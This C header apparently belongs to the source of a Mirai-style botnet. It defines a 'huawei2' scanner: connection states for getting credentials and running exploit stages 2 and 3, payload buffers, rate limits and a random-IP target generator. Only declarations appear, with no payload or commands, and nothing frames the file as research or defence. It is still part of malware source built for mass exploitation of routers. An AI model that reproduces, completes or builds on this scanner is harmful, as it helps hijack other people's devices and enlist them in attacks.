#pragma once

#include <stdint.h>

#include "includes.h"

#define huawei2_SCANNER_MAX_CONNS 128
#define huawei2_SCANNER_RAW_PPS 256

#define huawei2_SCANNER_RDBUF_SIZE 256
#define huawei2_SCANNER_HACK_DRAIN 64

struct huawei2_scanner_connection
{
    int fd, last_recv;
    enum
    {
        huawei2_SC_CLOSED,
        huawei2_SC_CONNECTING,
        huawei2_SC_GET_CREDENTIALS,
        huawei2_SC_EXPLOIT_STAGE2,
        huawei2_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[huawei2_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
};

void huawei2_init();
void huawei2_kill(void);

static void huawei2_setup_connection(struct huawei2_scanner_connection *);
static ipv4_t get2_random_ip(void);
